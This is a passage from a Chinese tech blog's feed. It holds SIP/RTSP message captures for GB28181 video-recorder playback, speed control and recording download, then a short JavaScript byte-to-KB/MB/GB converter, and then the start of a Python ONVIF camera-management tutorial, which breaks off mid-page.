class="hljs-number">17</span>T15:<span class="hljs-number">52</span>:<span class="hljs-number">31</span>.<span class="hljs-number">946</span><br><span class="hljs-attribute">Content</span>-Length:    <span class="hljs-number">57</span><br><br><span class="hljs-attribute">PLAY</span> RTSP/<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">21</span><br><span class="hljs-attribute">Scale</span>: <span class="hljs-number">1</span>.<span class="hljs-number">000000</span><br><span class="hljs-attribute">Range</span>: npt=<span class="hljs-number">0</span>-<br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK498785409<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">22</span> INFO<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: Application/RTSP<br><span class="hljs-attribute">User</span>-Agent: Embedded Net DVR/NVR/DVS<br><span class="hljs-attribute">Content</span>-Length:    <span class="hljs-number">66</span><br><br><span class="hljs-attribute">RTSP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">21</span><br><span class="hljs-attribute">RTP</span>-Info: seq=<span class="hljs-number">9810092</span>;rtptime=<span class="hljs-number">3450012</span><br></code></pre></td></tr></table></figure><h5 id="5-2-4-调整倍速-时间"><a href="#5-2-4-调整倍速-时间" class="headerlink" title="5.2.4 调整倍速/时间"></a>5.2.4 调整倍速/时间</h5><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INFO</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK1720900866<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">23</span> INFO<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: application/RTSP<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T15:<span class="hljs-number">52</span>:<span class="hljs-number">36</span>.<span class="hljs-number">954</span><br><span class="hljs-attribute">Content</span>-Length:    <span class="hljs-number">58</span><br><br><span class="hljs-attribute">PLAY</span> RTSP/<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">22</span><br><span class="hljs-attribute">Scale</span>: <span class="hljs-number">2</span>.<span class="hljs-number">000000</span><br><span class="hljs-attribute">Range</span>: npt=<span class="hljs-number">11</span>-<br><br></code></pre></td></tr></table></figure><blockquote><p>其中<code>Scale</code>是倍速，<code>Range</code>是距离该文件开始时间的相差时间</p></blockquote><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK1720900866<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">23</span> INFO<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: Application/RTSP<br><span class="hljs-attribute">User</span>-Agent: Embedded Net DVR/NVR/DVS<br><span class="hljs-attribute">Content</span>-Length:    <span class="hljs-number">66</span><br><br><span class="hljs-attribute">RTSP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">22</span><br><span class="hljs-attribute">RTP</span>-Info: seq=<span class="hljs-number">9810092</span>;rtptime=<span class="hljs-number">3450012</span><br><br></code></pre></td></tr></table></figure><h5 id="5-2-5-结束播放"><a href="#5-2-5-结束播放" class="headerlink" title="5.2.5 结束播放"></a>5.2.5 结束播放</h5><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BYE</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK2449791157<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">24</span> BYE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK2449791157<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">24</span> BYE<br><span class="hljs-attribute">User</span>-Agent: Embedded Net DVR/NVR/DVS<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h4 id="5-3-下载录像"><a href="#5-3-下载录像" class="headerlink" title="5.3 下载录像"></a>5.3 下载录像</h4><h5 id="5-3-1-下载"><a href="#5-3-1-下载" class="headerlink" title="5.3.1 下载"></a>5.3.1 下载</h5><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INVITE</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK1956839953<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">2542309601</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2112998906</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> INVITE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: application/sdp<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T16:<span class="hljs-number">04</span>:<span class="hljs-number">18</span>.<span class="hljs-number">763</span><br><span class="hljs-attribute">Subject</span>: <span class="hljs-number">34020000001110000001</span>:<span class="hljs-number">10000000000000018467</span>,<span class="hljs-number">34020000002000000010</span>:<span class="hljs-number">3000</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">272</span><br><br><span class="hljs-attribute">v</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">o</span>=<span class="hljs-number">34020000002000000010</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> IN IP4 <span class="hljs-number">192.168.6.106</span><br><span class="hljs-attribute">s</span>=Download<br><span class="hljs-attribute">u</span>=<span class="hljs-number">34020000001310000001</span>:<span class="hljs-number">3</span><br><span class="hljs-attribute">c</span>=IN IP4 <span class="hljs-number">192.168.6.106</span><br><span class="hljs-attribute">t</span>=<span class="hljs-number">1714804996</span> <span class="hljs-number">1714806986</span><br><span class="hljs-attribute">m</span>=video <span class="hljs-number">45056</span> RTP/AVP <span class="hljs-number">96</span> <span class="hljs-number">98</span> <span class="hljs-number">97</span><br><span class="hljs-attribute">a</span>=recvonly<br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">96</span> PS/<span class="hljs-number">90000</span><br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">98</span> H264/<span class="hljs-number">90000</span><br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">97</span> MPEG4/<span class="hljs-number">90000</span><br><span class="hljs-attribute">y</span>=<span class="hljs-number">0000003000</span><br><span class="hljs-attribute">f</span>=<br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK1956839953<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">2542309601</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">776353021</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2112998906</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> INVITE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: application/SDP<br><span class="hljs-attribute">User</span>-Agent: Embedded Net DVR/NVR/DVS<br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">282</span><br><br><span class="hljs-attribute">v</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">o</span>=<span class="hljs-number">34020000001110000001</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> IN IP4 <span class="hljs-number">192.168.6.60</span><br><span class="hljs-attribute">s</span>=Network Video Recorder<br><span class="hljs-attribute">c</span>=IN IP4 <span class="hljs-number">192.168.6.60</span><br><span class="hljs-attribute">t</span>=<span class="hljs-number">1714833796</span> <span class="hljs-number">1714835786</span><br><span class="hljs-attribute">m</span>=video <span class="hljs-number">62002</span> RTP/AVP <span class="hljs-number">96</span><br><span class="hljs-attribute">a</span>=sendonly<br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">96</span> PS/<span class="hljs-number">90000</span><br><span class="hljs-attribute">a</span>=username:<span class="hljs-number">34020000001110000001</span><br><span class="hljs-attribute">a</span>=password:zzgd1234<br><span class="hljs-attribute">a</span>=filesize:<span class="hljs-number">2124794308</span><br><span class="hljs-attribute">y</span>=<span class="hljs-number">0000003000</span><br><span class="hljs-attribute">f</span>=<br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ACK</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK4134523750<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">2542309601</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">776353021</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2112998906</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> ACK<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><p>然后是推流</p><h5 id="5-3-2-停止下载"><a href="#5-3-2-停止下载" class="headerlink" title="5.3.2 停止下载"></a>5.3.2 停止下载</h5><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BYE</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK303163387<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">2542309601</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">776353021</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2112998906</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">21</span> BYE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK303163387<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">2542309601</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">776353021</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2112998906</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">21</span> BYE<br><span class="hljs-attribute">User</span>-Agent: Embedded Net DVR/NVR/DVS<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>经验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JS计算字节大小，把字节转换为KB/MB/GB/TB等</title>
    <link href="/2024/04/newpost-55/"/>
    <url>/2024/04/newpost-55/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>通过JS函数，把诸如<code>1024</code>转为<code>1KB</code></p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>直接上方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">calcByte</span>(<span class="hljs-params">val</span>) &#123;<br>    <span class="hljs-keyword">let</span> unitList = [<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;KB&#x27;</span>, <span class="hljs-string">&#x27;MB&#x27;</span>, <span class="hljs-string">&#x27;GB&#x27;</span>, <span class="hljs-string">&#x27;TB&#x27;</span>];<br>    <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; unitList.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (val &lt; <span class="hljs-number">1024</span> ** (i + <span class="hljs-number">1</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (val / (<span class="hljs-number">1024</span> ** i)).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.?0*$/</span>, <span class="hljs-string">&#x27;&#x27;</span>) + unitList[i];<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 如果超出最大单位，显示为最大单位</span><br>    <span class="hljs-keyword">return</span> (val / (<span class="hljs-number">1024</span> ** (i - <span class="hljs-number">1</span>))).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\.?0*$/</span>, <span class="hljs-string">&#x27;&#x27;</span>) + unitList[i - <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>入参为字节，数值类型；如果觉得<code>TB</code>不够，在<code>TB</code>后边接着加即可，其中<code>**</code>表示次方，如2的3次方表示为<code>2**3</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Python中使用onvif管理摄像头，包括设备发现，获取RTSP地址，获取设备信息，截图，云台控制与缩放，设置时间</title>
    <link href="/2023/12/newpost-54/"/>
    <url>/2023/12/newpost-54/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>使用Python管理支持<code>ONVIF</code>的设备。支持：</p><ul><li>设备发现</li><li>获取RTSP地址</li><li>获取设备信息</li><li>截图</li><li>云台控制、缩放与聚焦</li><li>设置时间</li></ul><span id="more"></span><p>参考文档：<a href="https://www.onvif.org/onvif/ver20/util/operationIndex.html">wsdl文档</a>、<a href="https://pypi.org/project/onvif/">Python API</a> 本文严重参考并感谢：<a href="https://blog.csdn.net/u010881576/article/details/116885774">《ONVIF with python》</a></p><p>本文在上边的基础上，支持了多画面多码流的摄像头与NVR，并对更多功能做了详细说明，以下均基于<code>Python3.11</code>，其他版本可能略有不同</p><p>2024/1/23更新：适配NVR（多摄像头模式，可以独立控制每个摄像头），兼容了更多设备（部分设备的ONVIF有些限制，现在做了兼容）</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h3 id="一、安装包"><a href="#一、安装包" class="headerlink" title="一、安装包"></a>一、安装包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install onvif-zeep<br><span class="hljs-meta prompt_"># </span><span class="language-bash">WSDiscovery 用于设备发现，不用则不再需要安装</span><br>pip install WSDiscovery<br><span class="hljs-meta prompt_"># </span><span class="language-bash">requests 用于截图获取，不用则不需要安装</span><br>pip install requests<br></code></pre></td></tr></table></figure><h3 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h3><p>基本类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 